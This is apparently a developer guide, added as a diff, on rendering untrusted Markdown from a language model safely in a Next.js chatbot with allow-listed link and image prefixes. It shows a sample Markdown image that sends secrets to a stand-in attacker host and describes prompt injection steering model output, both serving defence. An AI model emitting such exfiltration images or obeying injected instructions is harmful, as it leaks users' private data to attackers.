@@ -1,0 +1,224 @@
+---
+title: Secure Markdown Rendering
+description: Safely render untrusted Markdown from language models to defend against image exfiltration and malicious links in a Next.js chatbot.
+tags: ['next', 'streaming', 'chatbot', 'markdown', 'security']
+---
+
+# Secure Markdown Rendering
+
+Language model output is untrusted input. When a model has access to tools, retrieval, or any content a third party can influence, its response can be steered by [prompt injection](https://vercel.com/blog/building-secure-ai-agents). If you render that response as Markdown without restrictions, an attacker can use it to leak data or phish your users.
+
+The most common attack is **image exfiltration**. Markdown images load automatically, so a single injected image is enough to send private context to an attacker:
+
+```markdown
+![](https://attacker.example/log?data=THE_MODELS_CONTEXT_OR_A_SECRET)
+```
+
+When the browser renders that image, it makes a request to `attacker.example` with the secret encoded in the URL, with no click required. Malicious links (`[Click here](https://attacker.example)`) are a related risk for phishing.
+
+The fix is to allow-list the origins that links and images may point to. This recipe covers the two cases you'll run into:
+
+1. **You render the Markdown yourself** (for example, in a React chatbot): use [`harden-react-markdown`](https://github.com/vercel/harden-react-markdown).
+2. **You pass the Markdown to a third party that renders it** (for example, a GitHub or GitLab comment): use [`markdown-to-markdown-sanitizer`](https://www.npmjs.com/package/markdown-to-markdown-sanitizer).
+
+## Rendering Markdown yourself
+
+### Installation
+
+Install `harden-react-markdown` alongside `react-markdown`:
+
+```bash
+npm install harden-react-markdown react-markdown
+```
+
+### Server
+
+Use a route handler that streams a Markdown response from the model. This is the standard chatbot setup, where the model is instructed to answer in Markdown.
+
+```tsx filename='app/api/chat/route.ts'
+import {
+  convertToModelMessages,
+  createUIMessageStreamResponse,
+  streamText,
+  toUIMessageStream,
+  type UIMessage,
+} from 'ai';
+
+export async function POST(req: Request) {
+  const { messages }: { messages: UIMessage[] } = await req.json();
+
+  const result = streamText({
+    instructions:
+      'You are a helpful assistant. Respond to the user in Markdown format.',
+    model: 'openai/gpt-4o',
+    messages: await convertToModelMessages(messages),
+  });
+
+  return createUIMessageStreamResponse({
+    stream: toUIMessageStream({ stream: result.stream }),
+  });
+}
+```
+
+### Hardened Markdown component
+
+`harden-react-markdown` wraps `react-markdown` and blocks any link or image whose URL does not start with an allowed prefix. Wrap the component once and reuse it everywhere you render model output.
+
+```tsx filename='components/hardened-markdown.tsx'
+'use client';
+
+import ReactMarkdown from 'react-markdown';
+import hardenReactMarkdown from 'harden-react-markdown';
+
+// Create a hardened version of ReactMarkdown once, at module scope.
+const HardenedMarkdown = hardenReactMarkdown(ReactMarkdown);
+
+export function HardenedResponse({ content }: { content: string }) {
+  return (
+    <HardenedMarkdown
+      // Relative URLs are resolved against this origin before they are checked.
+      defaultOrigin="https://example.com"
+      // Only render links and images whose URL starts with a trusted prefix.
+      // Everything else is blocked: links become plain text with a `[blocked]`
+      // marker, and images are replaced with a placeholder.
+      allowedLinkPrefixes={['https://example.com/']}
+      allowedImagePrefixes={['https://example.com/images/']}
+    >
+      {content}
+    </HardenedMarkdown>
+  );
+}
+```
+
+<Note>
+  Keep image prefixes as narrow as possible, for example
+  `https://example.com/images/` rather than a bare origin. Images load
+  automatically, so an open redirect on a broad prefix can be used to smuggle an
+  exfiltration URL. Link prefixes often need to cover a whole origin because
+  users navigate to many pages; that is a smaller risk since a link requires a
+  deliberate click. The package does not resolve path traversal (`/../`), so
+  make sure your server does not either.
+</Note>
+
+### Client
+
+On the client, use the `useChat` hook to manage chat state and render each text part through the hardened component instead of rendering raw Markdown.
+
+```tsx filename='app/page.tsx'
+'use client';
+
+import { Chat, useChat } from '@ai-sdk/react';
+import { DefaultChatTransport } from 'ai';
+import { useState } from 'react';
+import { HardenedResponse } from '@/components/hardened-markdown';
+
+const chat = new Chat({
+  transport: new DefaultChatTransport({
+    api: '/api/chat',
+  }),
+});
+
+export default function Page() {
+  const { messages } = useChat({ chat });
+
+  return (
+    <div className="flex flex-col w-full max-w-xl py-24 mx-auto stretch">
+      <div className="space-y-8 mb-4">
+        {messages.map(message => (
+          <div key={message.id}>
+            <div className="font-bold mb-2">
+              {message.role === 'user' ? 'You' : 'Assistant'}
+            </div>
+            <div className="prose space-y-2">
+              {message.parts.map((part, index) => {
+                if (part.type === 'text') {
+                  return (
+                    <HardenedResponse
+                      key={`${message.id}-text-${index}`}
+                      content={part.text}
+                    />
+                  );
+                }
+              })}
+            </div>
+          </div>
+        ))}
+      </div>
+
+      <MessageInput />
+    </div>
+  );
+}
+
+const MessageInput = () => {
+  const [input, setInput] = useState('');
+  const { sendMessage } = useChat({ chat });
+
+  return (
+    <form
+      onSubmit={event => {
+        event.preventDefault();
+        sendMessage({ text: input });
+        setInput('');
+      }}
+    >
+      <input
+        className="fixed bottom-0 w-full max-w-xl p-2 mb-8 dark:bg-zinc-900 border border-zinc-300 dark:border-zinc-800 rounded shadow-xl"
+        placeholder="Say something..."
+        value={input}
+        onChange={event => setInput(event.target.value)}
+      />
+    </form>
+  );
+};
+```
+
+With this in place, an injected image such as `![](https://attacker.example/log?data=secret)` is never requested by the browser, because `attacker.example` is not in `allowedImagePrefixes`.
+
+## Passing Markdown to a third party
+
+Sometimes you don't render the Markdown yourself. You send it somewhere else that renders it, such as a GitHub or GitLab comment. In that case you can't rely on a React component; you need to sanitize the Markdown text itself before it leaves your server.
+
+[`markdown-to-markdown-sanitizer`](https://www.npmjs.com/package/markdown-to-markdown-sanitizer) consumes Markdown and returns sanitized Markdown, rewriting disallowed links and images so the downstream renderer can't be used for exfiltration.
+
+```bash
+npm install markdown-to-markdown-sanitizer
+```
+
+```ts filename='app/api/publish/route.ts'
+import { sanitizeMarkdown } from 'markdown-to-markdown-sanitizer';
+
+export async function POST(req: Request) {
+  const { markdown }: { markdown: string } = await req.json();
+
+  const safeMarkdown = sanitizeMarkdown(markdown, {
+    defaultOrigin: 'https://example.com',
+    allowedLinkPrefixes: ['https://example.com/'],
+    allowedImagePrefixes: ['https://example.com/images/'],
+    // Enable when the downstream renderer is GitHub-flavored / CommonMark,
+    // so the output relies on Markdown parsing rather than HTML entities.
+    sanitizeForCommonmark: true,
+  });
+
+  // ...forward `safeMarkdown` to the third-party service.
+  return Response.json({ markdown: safeMarkdown });
+}
+```
+
+Disallowed links are rewritten to `#` and disallowed images to an empty source, so neither can trigger a request to an attacker-controlled URL.
+
+<Note>
+  Sanitizing rendered output (such as the final HTML) is generally more robust
+  than sanitizing Markdown, because Markdown parsing differs between renderers.
+  Reach for `markdown-to-markdown-sanitizer` specifically when a third party
+  does the rendering and HTML sanitization is not an option. It is also
+  comparatively new and provides no security guarantees of its own, so validate
+  its configuration against your own threat model.
+</Note>
+
+## Conclusion
+
+- Treat model output as untrusted, especially when tools or retrieval are involved.
+- Rendering Markdown yourself: wrap `react-markdown` with `harden-react-markdown` and allow-list link and image prefixes.
+- Handing Markdown to a third-party renderer: sanitize the Markdown with `markdown-to-markdown-sanitizer` before it leaves your server.
+- Use specific path prefixes, not bare origins, to avoid open-redirect bypasses.
